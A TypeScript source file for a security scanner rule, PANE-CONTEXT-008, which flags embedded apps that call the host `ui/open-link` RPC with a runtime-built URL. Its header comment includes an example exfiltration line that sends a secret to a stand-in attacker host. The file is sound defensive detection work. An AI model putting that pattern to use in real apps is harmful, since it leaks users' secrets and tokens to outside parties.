/**
 * PANE-CONTEXT-008 — `ui/open-link` with a non-literal / concatenated URL.
 *
 * Split from PANE-CONTEXT-003 (docs/RULES.md § PANE-CONTEXT): `ui/open-link`
 * is a HOST RPC. It is not subject to the app's CSP at all — the host opens
 * the URL in the user's own browser, with the user's own cookies. An app
 * calling `app.openLink("https://attacker.tld/?d=" + secret)` exfiltrates
 * completely, and no `_meta.ui.csp` field can block it: `connect-src`,
 * `resourceDomains`, `frameDomains` and `baseUriDomains` all govern *fetch*
 * directives, and this is not a fetch.
 */

import type { Finding, RuleContext, RuleResult } from '../../types.js';
import { defineRule, makeFinding } from '../shared/helpers.js';
import { isLiteralExpression } from '../../parse/js.js';
import type { Node } from 'acorn';
import { scriptsOf, rebase, sourceOf } from '../exfil/url-shape.js';
import { findOpenLinkSites } from './shared.js';

const REMEDIATION =
  '`ui/open-link` is a host RPC with no CSP field governing it — `connect-src`, `resourceDomains`, ' +
  '`frameDomains` and `baseUriDomains` all map to *fetch* directives, and opening a link is not a ' +
  'fetch. Do not build this URL from any value the app did not author itself, and never concatenate ' +
  'secrets, tokens, or tool output into it.';

export const context008 = defineRule({
  id: 'PANE-CONTEXT-008',
  ruleClass: 'RISK',
  severity: 'HIGH',
  confidence: 'HIGH',
  title: 'App calls ui/open-link with a non-literal URL',
  cwe: 'CWE-201',
  specRef: 'SPEC-REFERENCE.md §4 — ui/open-link is a host RPC, immune to the app CSP',
  remediation: REMEDIATION,
  experimental: false,
  status: 'active',
  since: '0.1.0',
  requires: ['content'],

  check(ctx: RuleContext): RuleResult {
    const scripts = scriptsOf(ctx);
    const findings: Finding[] = [];
    let n = 0;

    for (const site of findOpenLinkSites(scripts)) {
      if (isLiteralExpression(site.urlNode as unknown as Node)) continue;
      const loc = rebase(site.script, site.node);
      findings.push(
        makeFinding({
          ctx,
          rule: context008,
          message:
            'The app requests `ui/open-link` with a URL built at runtime (concatenation or template ' +
            'interpolation). `ui/open-link` is a host RPC the app\'s CSP does not govern — the host ' +
            'opens it in the user\'s own browser with the user\'s own cookies — so any value folded ' +
            'into this URL is fully exfiltrated regardless of `_meta.ui.csp`.',
          evidence: sourceOf(site.script, site.node),
          ...(loc ? { location: loc } : {}),
          path: `script#${n++}`,
        }),
      );
    }

    return { findings };
  },
});

export default context008;
